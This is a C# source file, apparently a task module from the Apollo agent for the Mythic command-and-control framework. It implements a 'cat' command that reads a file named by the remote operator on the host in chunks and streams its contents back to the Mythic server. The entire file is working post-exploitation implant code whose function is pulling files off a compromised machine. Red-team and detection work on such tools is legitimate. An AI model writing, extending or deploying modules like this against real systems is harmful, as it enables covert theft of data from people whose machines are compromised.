#define COMMAND_NAME_UPPER

#if DEBUG
#define CAT
#endif

#if CAT
using System;
using ApolloInterop.Classes;
using ApolloInterop.Interfaces;
using ApolloInterop.Structs.MythicStructs;
using System.Runtime.Serialization;
using System.Threading;
using ApolloInterop.Classes.Collections;
using System.IO;
using TT = System.Threading.Tasks;
namespace Tasks
{
    public class cat : Tasking
    {
        [DataContract]
        internal struct CatParameters
        {
            [DataMember(Name = "path")]
            public string Path;
        }

        private AutoResetEvent _complete = new AutoResetEvent(false);
        private AutoResetEvent _fileRead = new AutoResetEvent(false);
        private bool _completed = false;
        private ThreadSafeList<string> _contents = new ThreadSafeList<string>();
        private Action _flushContents;
        private WaitHandle[] _timers;
        private static int _chunkSize = 256000;
        private byte[] _buffer = new byte[_chunkSize];
        private long _bytesRemaining = 0;

        public cat(IAgent agent, MythicTask mythicTask) : base(agent, mythicTask)
        {
            _timers = new WaitHandle[]
            {
                _complete,
                _cancellationToken.Token.WaitHandle
            };
            _flushContents = new Action(() =>
            {
                string output = "";
                while(!_cancellationToken.IsCancellationRequested && !_completed)
                {
                    WaitHandle.WaitAny(_timers, 1000);

                    output = string.Join("", _contents.Flush());
                    SendMessageToMythic(output);
                }
                output = string.Join("", _contents.Flush());
                SendMessageToMythic(output);
            });
        }

        private void SendMessageToMythic(string msg)
        {
            if (!string.IsNullOrEmpty(msg))
            {
                MythicTaskResponse resp = CreateTaskResponse(
                    msg,
                    false,
                    "");
                _agent.GetTaskManager().AddTaskResponseToQueue(resp);
            }
        }

        private void FileReadCallback(IAsyncResult result)
        {
            FileStream fs = (FileStream)result.AsyncState;
            fs.EndRead(result);
            try
            {
                _contents.Add(System.Text.Encoding.UTF8.GetString(_buffer));
                _bytesRemaining = fs.Length - fs.Position;
                if (_bytesRemaining > 0 && !_cancellationToken.IsCancellationRequested)
                {
                    _buffer = _bytesRemaining > _chunkSize ? new byte[_chunkSize] : new byte[_bytesRemaining];
                    fs.BeginRead(_buffer, 0, _buffer.Length, FileReadCallback, fs);
                } else
                {
                    _fileRead.Set();
                }
            } catch (Exception ex)
            {
                _agent.GetTaskManager().AddTaskResponseToQueue(CreateTaskResponse(
                    $"Exception hit while reading file: {ex.Message}", true, "error"));
                _fileRead.Set();
            }
        }


        public override void Start()
        {
            MythicTaskResponse resp;
            CatParameters parameters = _jsonSerializer.Deserialize<CatParameters>(_data.Parameters);
            if (!File.Exists(parameters.Path))
            {
                resp = CreateTaskResponse($"File {parameters.Path} does not exist.", true, "error");
            }
            else
            {
                
                TT.Task.Factory.StartNew(_flushContents, _cancellationToken.Token);
                FileStream fs = null;
                FileInfo finfo = new FileInfo(parameters.Path);
                IMythicMessage[] artifacts = new IMythicMessage[]
                {
                    Artifact.FileOpen(finfo.FullName)
                };
                try
                {
                    fs = File.OpenRead(parameters.Path);
                    _bytesRemaining = fs.Length;
                    if (_bytesRemaining < _buffer.Length)
                    {
                        _buffer = new byte[_bytesRemaining];
                    }

                    fs.BeginRead(_buffer, 0, _buffer.Length, FileReadCallback, fs);
                    try
                    {
                        WaitHandle.WaitAny(new WaitHandle[]
                        {
                            _fileRead,
                            _cancellationToken.Token.WaitHandle
                        });
                    }
                    catch (OperationCanceledException)
                    {
                    }

                    _completed = true;
                    _complete.Set();
                    resp = CreateTaskResponse("", true, "completed", artifacts);
                }
                catch (UnauthorizedAccessException ex)
                {
                    resp = CreateTaskResponse("Access denied.", true, "error", artifacts);
                }
                catch (Exception ex)
                {
                    resp = CreateTaskResponse($"Unable to read {parameters.Path}: {ex.Message}", true, "error", artifacts);
                }
            }

            _agent.GetTaskManager().AddTaskResponseToQueue(resp);
        }
    }
}
#endif